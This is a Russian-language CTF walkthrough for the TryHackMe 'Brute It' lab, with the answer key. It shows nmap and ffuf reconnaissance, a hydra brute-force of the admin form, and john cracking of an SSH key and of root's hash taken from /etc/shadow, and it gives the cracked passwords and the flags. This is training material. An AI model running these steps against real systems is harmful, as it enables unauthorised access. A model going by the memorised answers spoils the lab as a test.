[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Brute It](https://tryhackme.com/r/room/bruteit) 

Всего 4 заданий:
## Задание 1
В этом блоке вы узнаете о:
- Грубая сила
- Взлом хэша
- Повышение привилегий

Подключитесь к сети TryHackMe и разверните машину.

### Ответьте на вопросы ниже
Разверните машину
```commandline
Ответ не нужен
```

## Задание 2
Прежде чем атаковать, давайте получим информацию о цели.
### Ответьте на вопросы ниже
Поиск открытых портов с помощью nmap.
Сколько портов открыто?
```commandline
nmap -sC -sV -oN nmap/initial 10.10.204.93
```
```commandline
2
```
Какая версия SSH используется?
```commandline
OpenSSH 7.6p1
```
Какая версия Apache используется?
```commandline
2.4.29
```
Какой дистрибутив Linux используется?
```commandline
Ubuntu
```
Поиск скрытых каталогов на веб-сервере.
Что такое скрытый каталог?
```commandline
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt:FUZZ -u http://10.10.204.93:80/FUZZ
# http://10.10.204.93/admin
```
```commandline
/admin
```

## Задание 3
Найдите форму для получения оболочки по SSH.

### Ответьте на вопросы ниже
Какой у вас пользователь:пароль панели администратора?
```commandline
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.94.46 http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid"
```
```commandline
admin:xavier
```
Взломайте ключ RSA, который вы нашли.
Какова парольная фраза закрытого ключа RSA Джона?
```commandline
ssh2 id_rsa > RSAkey.txt
john RSAkey.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
```commandline
rockinroll
```
пользователь.txt
```commandline
chmod 600 id_rsa
ssh -i id_rsa john@10.10.204.93
```
```commandline
THM{a_password_is_not_a_barrier}
```
Веб-флаг

```commandline
THM{brut3_f0rce_is_e4sy}
```

## Задание 4
Теперь нам нужно расширить наши привилегии.
### Ответьте на вопросы ниже
Найдите форму для повышения привилегий.
Какой пароль root?
```commandline
sudo -l
cat /etc/shadow
john --wordlist=/usr/share/wordlists/rockyou.txt roothash.txt
```
```commandline
football
```
корень.txt
```commandline
su root
cd /root
cat root.txt
```
```commandline
THM{pr1v1l3g3_3sc4l4t10n}
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)